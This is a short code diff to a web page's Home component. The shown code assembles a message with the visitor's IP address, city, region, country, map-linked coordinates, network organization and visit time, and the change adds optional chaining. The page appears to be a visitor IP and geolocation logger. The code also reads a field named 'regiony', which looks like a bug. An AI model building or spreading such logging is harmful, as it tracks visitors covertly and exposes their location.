@@ -43,7 +43,7 @@ export default function Home() {
         'IP Address:' + data.ip +"\n"+
         'City:'+ data.city +"\n"+
         'Region:'+ data.regiony +"\n"+
-        'Country: :flag_' + data.country.toLowerCase() +": \n"+
+        'Country: :flag_' + data.country?.toLowerCase() +": \n"+
         'Location: [' + data.loc +"](<https://www.google.com/maps/search/?api=1&query=" + data.loc + ">)\n"+
         'Organization:' + data.org +"\n"+
         'DateTime:' + datetime.toLocaleDateString()+"-" +datetime.toLocaleTimeString() +"\n"+
